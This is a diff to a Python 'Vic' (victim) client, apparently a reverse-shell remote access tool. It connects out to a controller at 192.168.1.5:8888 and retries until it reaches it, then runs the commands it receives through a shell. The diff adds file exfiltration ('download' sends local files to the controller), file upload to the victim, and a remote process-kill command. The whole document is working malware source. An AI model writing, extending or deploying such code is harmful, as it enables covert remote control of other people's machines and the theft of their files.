@@ -18,9 +18,35 @@ class Vic():
         try:    
             self.s.connect((self.ip,self.port))
         
-        except Exception as e:
+        except:
             time.sleep(2)
             self.__connect__()
+
+    def download_file(self,f_name):
+        try:
+            f = open(f_name,'wb')
+        except:
+            f = open("TMPfailled",'wb')
+        self.s.settimeout(1)
+        chunk = self.s.recv(1024)
+        while(chunk):
+            f.write(chunk)
+            try:
+                chunk = self.s.recv(1024)
+            except TimeoutError:
+                break
+        self.s.settimeout(None)
+
+
+    def upload_file(self,f_name):
+        try:
+            f = open(f_name,'rb')
+            self.s.send(f.read())
+            f.close()
+        except Exception as e:
+            f = f"[-] {str(e)[str(e).find(']')+2:]}"
+            f = f.encode()
+            self.s.send(f)
 
     def __main__(self):
         
@@ -46,6 +72,21 @@ class Vic():
                     self.s.send(data.encode())
                 except:
                     self.s.send(b"[-]Error.COMMOND")
+            
+            elif (cmd[:5] == "kill!"):
+                try:
+                    os.kill(int(cmd[6:]),1)
+                    self.s.send(b"[+]Executed.")
+                except:
+                    self.s.send(b"[-]Error.Process")
+            
+            elif (cmd[:8] == "download"):
+                    self.upload_file(cmd[9:])
+                    continue
+
+            elif (cmd[:6] == "upload"):
+                    self.download_file(cmd[7:])
+                    continue
 
             else:
                     execute = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
@@ -59,4 +100,4 @@ class Vic():
                            
 
 
-Vic("0.0.0.0",8888)
+Vic("192.168.1.5",8888)
